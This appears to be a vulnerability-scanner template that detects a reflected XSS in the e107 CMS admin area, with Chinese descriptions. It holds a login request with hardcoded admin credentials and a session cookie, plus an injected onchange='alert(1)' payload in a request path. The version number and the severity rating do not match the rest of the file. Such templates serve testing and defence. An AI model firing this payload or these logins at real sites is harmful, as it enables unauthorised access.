id: e107-CMS-v3.2.1-XSS-Reflected-Via-adding-comment

info:
  name: e107 CMS v3.2.1 后台XSS反映-通过添加评论
  author: daffainfo
  severity: critical
  description: XSS反映-通过添加评论
  reference:
    - https://www.exploit-db.com/exploits/50910

#必须需要账号密码和Cookie，后台XSS漏洞

rules:
  r0:
    request:
      method: POST
      path: /e107_2.3.2_full/news.php 
      body: |
        username=admin&userpass=admin123&userlogin=Login
      headers:
         Cookie: e107_tzOffset=-480; PHPSESSID=p4s256t6kaorni5i3ifelrjnp7
    expression: "true"
  r1:
    request:
      method: POST
      path: /e107_2.3.2_full/news.php/fnzi4'onchange='alert(1)'?extend.1
      headers:
         Cookie: e107_tzOffset=-480; PHPSESSID=p4s256t6kaorni5i3ifelrjnp7
    expression: response.status == 200 && response.body.bcontains(b'%27alert(1)%27?extend.1') && response.headers["content-type"].contains("text/html")
expression: r0() && r1()